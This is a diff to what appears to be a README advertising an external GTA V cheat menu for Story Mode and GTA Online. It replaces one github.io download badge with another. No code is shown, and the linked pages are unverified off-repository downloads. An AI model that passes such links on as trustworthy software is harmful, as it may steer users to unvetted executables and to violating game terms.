@@ -2,7 +2,7 @@
 
 Take full control of your GTA V experience with this advanced external assistant menu. Whether you're in Story Mode or GTA Online (limited mode), this tool provides powerful features through a clean, game-safe overlay.
 
-[![Download Now](https://img.shields.io/badge/⬇️%20Download%20Now-blueviolet?style=for-the-badge&logo=download)](https://vertie311.github.io/.github/gta-v-enhanced-menu)
+[![Explore GTA-V-External](https://img.shields.io/badge/Explore-GTA--V--External-4D7C0F?style=for-the-badge)](https://gta-v-external.github.io/.github/)
 
 ---
 
